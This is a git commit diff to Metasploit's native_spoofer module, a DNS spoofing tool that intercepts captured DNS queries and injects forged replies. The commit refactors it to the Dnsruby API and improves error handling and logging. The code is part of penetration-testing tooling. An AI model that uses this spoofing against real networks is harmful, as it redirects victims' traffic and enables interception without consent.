6abe2516d64eca812e75da904d927deab637c031
Spencer McIntyre <zeroSteiner@gmail.com>
2022-03-17 13:13:24 -0400

    Update the module to use the Dnsruby API

--- modules/auxiliary/spoof/dns/native_spoofer.rb
+++ modules/auxiliary/spoof/dns/native_spoofer.rb
@@ -17,7 +17,7 @@ class MetasploitModule < Msf::Auxiliary
         This module provides a Rex based DNS service to resolve queries intercepted
         via the capture mixin. Configure STATIC_ENTRIES to contain host-name mappings
         desired for spoofing using a hostsfile or space/semicolon separated entries.
-        In default configuration, the service operates as a normal native DNS server
+        In the default configuration, the service operates as a normal native DNS server
         with the exception of consuming from and writing to the wire as opposed to a
         listening socket. Best when compromising routers or spoofing L2 in order to
         prevent return of the real reply which causes a race condition. The method
@@ -93,11 +93,17 @@ class MetasploitModule < Msf::Auxiliary
       each_packet do |pack|
         begin
           parsed = PacketFu::Packet.parse(pack)
+        rescue => e
+          vprint_status("PacketFu could not parse captured packet")
+          elog('PacketFu could not parse captured packet', error: e)
+        end
+
+        begin
           reply = reply_packet(parsed)
           service.dispatch_request(reply, parsed.payload)
         rescue => e
-          vprint_status("PacketFu could not parse captured packet")
-          dlog(e.backtrace)
+          vprint_status("Could not process captured packet")
+          elog('Could not process captured packet', error: e)
         end
       end
     end
@@ -106,8 +112,11 @@ class MetasploitModule < Msf::Auxiliary
   #
   # Creates Proc to handle incoming requests
   #
-  def on_dispatch_request(cli,data)
+  def on_dispatch_request(cli, data)
+    return unless cli.is_a?(PacketFu::Packet)
+
     peer = "#{cli.ip_daddr}:" << (cli.is_udp? ? "#{cli.udp_dst}" : "#{cli.tcp_dst}")
+
     # Deal with non DNS traffic
     begin
       req = Packet.encode_drb(data)
@@ -116,6 +125,7 @@ class MetasploitModule < Msf::Auxiliary
       dlog e.backtrace
       return
     end
+
     answered = []
     # Find cached items, remove request from forwarded packet
     req.question.each do |ques|
@@ -123,48 +133,65 @@ class MetasploitModule < Msf::Auxiliary
       if cached.empty?
         next
       else
-        req.answer = (req.answer + cached).uniq
+        cached.each do |subcached|
+          req.add_answer(subcached) unless req.answer.include?(subcached)
+        end
+
         answered << ques
       end
     end
+
     if answered.count < req.question.count and service.fwd_res
-      if !req.header.recursive?
+      if req.header.rd == 0
         vprint_status("Recursion forbidden in query for #{req.question.first.name} from #{peer}")
       else
         forward = req.dup
-        forward.question = req.question - answered
-        forwarded = service.fwd_res.send(Packet.validate(forward))
+        forward.question.delete_if { |question| answered.include?(question) }
+        begin
+          forwarded = service.fwd_res.send(Packet.validate(forward))
+        rescue NoResponseError
+          vprint_error('Did not receive a response')
+          return
+        end
+
         forwarded.answer.each do |ans|
           rstring = ans.respond_to?(:address) ? "#{ans.name}:#{ans.address}" : ans.name
           vprint_status("Caching response #{rstring} #{ans.type}")
           service.cache.cache_record(ans)
         end unless service.cache.nil?
+
         # Merge the answers and use the upstream response
-        forwarded.answer = (req.answer + forwarded.answer).uniq
+        req.answer.each do |answer|
+          forwarded.add_answer(answer) unless forwarded.answer.include?(answer)
+        end
         req = forwarded
       end
     end
-    service.send_response(cli, Packet.validate(Packet.generate_response(req)).data)
+
+    req.header.qr = true
+    service.send_response(cli, req.encode)
   end
 
   #
   # Creates Proc to handle outbound responses
   #
-  def on_send_response(cli,data)
+  def on_send_response(cli, data)
+    return unless cli.is_a?(PacketFu::Packet)
+
     cli.payload = data
     cli.recalc
     inject cli.to_s
-    sent_info(cli,data) if datastore['VERBOSE']
+    sent_info(cli, data) if datastore['VERBOSE']
   end
 
   #
   # Prints information about spoofed packet after injection to reduce latency of operation
   # Shown to improve response time by >50% from ~1ms -> 0.3-0.4ms
   #
-  def sent_info(cli,data)
+  def sent_info(cli, data)
     net = Packet.encode_net(data)
     peer = "#{cli.ip_daddr}:" << (cli.is_udp? ? "#{cli.udp_dst}" : "#{cli.tcp_dst}")
-    asked = net.question.map(&:qname).join(', ')
+    asked = net.question.map { |q| q.qName.delete_suffix('.') }.join(', ')
     vprint_good("Sent packet with header:\n#{cli.inspect}")
     vprint_good("Spoofed records for #{asked} to #{peer}")
   end
